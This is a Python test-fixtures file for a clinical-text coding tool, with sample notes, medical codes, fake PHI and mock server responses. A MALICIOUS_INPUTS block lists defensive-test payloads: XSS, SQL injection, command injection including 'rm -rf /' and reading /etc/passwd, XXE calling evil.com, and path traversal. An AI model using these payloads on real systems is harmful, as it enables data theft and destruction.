"""
Test data fixtures for unit and integration tests
"""

# Sample clinical texts for testing
CLINICAL_TEXTS = {
    'simple': "Patient with hypertension prescribed lisinopril.",
    
    'complex': """75-year-old male with type 2 diabetes mellitus, 
                  hypertension, and chronic kidney disease stage 3. 
                  Currently on metformin 1000mg BID, lisinopril 10mg daily. 
                  Recent HbA1c was 7.2%. Requires walker for ambulation.""",
    
    'with_devices': """Post-operative patient with indwelling urinary catheter. 
                      Using CPAP machine for sleep apnea. 
                      Blood glucose monitoring with glucometer QID.""",
    
    'with_labs': """CBC showed WBC 12.5, Hgb 10.2, Plt 150. 
                    Comprehensive metabolic panel revealed creatinine 2.1. 
                    Lipid panel: Total cholesterol 220, LDL 140, HDL 35.""",
    
    'mixed': """Patient admitted with chest pain and shortness of breath. 
                EKG showed ST elevation in leads II, III, aVF. 
                Started on aspirin, atorvastatin, and metoprolol. 
                Cardiac catheterization planned.""",
    
    'with_phi': """John Smith, DOB 01/15/1950, MRN 123456789, 
                   presented to clinic with complaints of fatigue. 
                   Phone: 555-123-4567. Address: 123 Main St, Anytown, USA.""",
    
    'empty': "",
    
    'special_chars': "Patient with <script>alert('xss')</script> diagnosis",
    
    'unicode': "Patient with 糖尿病 (diabetes) and hypertension",
    
    'injection': "'; DROP TABLE patients; -- SQL injection attempt",
    
    'very_long': "Patient with hypertension. " * 500
}

# Expected entity mappings for validation
EXPECTED_ENTITIES = {
    'hypertension': {
        'category': 'diagnosis',
        'codes': {
            'icd10': 'I10',
            'snomed': '38341003'
        }
    },
    'lisinopril': {
        'category': 'medication',
        'codes': {
            'rxnorm': '29046'
        }
    },
    'diabetes mellitus': {
        'category': 'diagnosis',
        'codes': {
            'icd10': 'E11.9',
            'snomed': '44054006'
        }
    },
    'urinary catheter': {
        'category': 'device',
        'codes': {
            'hcpcs': 'A4338'
        }
    },
    'CBC': {
        'category': 'lab',
        'codes': {
            'loinc': '58410-2'
        }
    }
}

# PHI patterns for de-identification testing
PHI_PATTERNS = {
    'name': [
        'John Smith',
        'Jane Doe',
        'Dr. Robert Johnson'
    ],
    'mrn': [
        'MRN 123456789',
        'MRN: 987654321',
        'Medical Record #: 555666777'
    ],
    'dob': [
        'DOB 01/15/1950',
        'Date of Birth: 12/25/1980',
        'Born on 06/30/1975'
    ],
    'phone': [
        '555-123-4567',
        '(555) 987-6543',
        'Phone: 555.246.8135'
    ],
    'ssn': [
        '123-45-6789',
        'SSN: 987-65-4321',
        'Social Security: 111-22-3333'
    ],
    'address': [
        '123 Main St',
        '456 Oak Avenue, Apt 2B',
        '789 Elm Street, Suite 100'
    ],
    'email': [
        'patient@email.com',
        'john.doe@example.org',
        'jsmith123@mail.net'
    ]
}

# Malicious input patterns for security testing
MALICIOUS_INPUTS = {
    'xss': [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')"
    ],
    'sql_injection': [
        "'; DROP TABLE patients; --",
        "1' OR '1'='1",
        "admin'--"
    ],
    'command_injection': [
        "; cat /etc/passwd",
        "| rm -rf /",
        "`whoami`"
    ],
    'xxe': [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<!ENTITY xxe SYSTEM "http://evil.com/steal">',
    ],
    'path_traversal': [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    ]
}

# Valid medical codes for testing
VALID_CODES = {
    'icd10': ['I10', 'E11.9', 'N18.3', 'J44.0', 'R07.9'],
    'snomed': ['38341003', '44054006', '90688005', '13645005', '29857009'],
    'loinc': ['2345-7', '4548-4', '2160-0', '33914-3', '2951-2'],
    'rxnorm': ['29046', '6809', '7052', '1049221', '316672'],
    'hcpcs': ['A4338', 'A4351', 'E0601', 'K0001', 'E0424']
}

# Server responses for mocking
MOCK_SERVER_RESPONSES = {
    'success': "1,{code}\n",
    'no_match': "1,NO_MATCH\n",
    'error': "1,ERROR: Internal server error\n",
    'timeout': "1,TIMEOUT\n",
    'invalid': "INVALID_RESPONSE",
    'empty': "",
    'malformed': "1,CODE,EXTRA,DATA\n"
}